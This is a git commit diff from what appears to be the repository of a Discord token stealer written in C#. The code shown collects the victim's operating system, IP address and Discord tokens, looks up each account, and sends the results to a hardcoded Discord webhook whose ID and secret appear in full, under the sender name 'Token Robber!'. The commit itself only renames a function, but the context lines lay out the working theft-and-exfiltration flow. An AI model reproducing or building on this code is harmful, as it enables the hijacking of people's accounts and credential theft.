793e4fb807de7a850d50330ec6f641feff94a415
EbicHecker <ebicdev@pm.me>
2021-12-13 15:20:14 +0100

    yes 2.0

--- Program.cs
+++ Program.cs
@@ -8,13 +8,13 @@ StringBuilder content = new StringBuilder()
     .AppendLine($"Operating System: {Environment.OSVersion.Platform} ({(Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit")})")
     .AppendLine($"IP-Address: {await IpInfo.GetIPAddress()}")
     .AppendLine("Tokens: ");
-await Parallel.ForEachAsync(TokenParser.Parse(), async (token, cts) => await AppendUserSummary(token, cts));
+await Parallel.ForEachAsync(TokenParser.Parse(), async (token, cts) => await AppendDiscordUserSummary(token, cts));
 using DiscordWebhook webhook = new DiscordWebhook("913528883410771989", "bpci971IJ8tSAvn0iPqiJ2HioRhy5RD_6syK-Avg4iqTTQa7pGMvxLMvOXNIyvxEJi3C");
 await webhook.SendMessage(new DiscordMessage(content.ToString(), "Token Robber!", "https://cdn.discordapp.com/emojis/889939729099943967.png?size=256"));
 
-async Task AppendUserSummary(string token, CancellationToken cts)
+async Task AppendDiscordUserSummary(string userToken, CancellationToken cts = default)
 {
-    DiscordClient client = new DiscordClient(token);
+    DiscordClient client = new DiscordClient(userToken);
     string? summary = await client.GetUserSummary(cts);
     lock (content)
     {
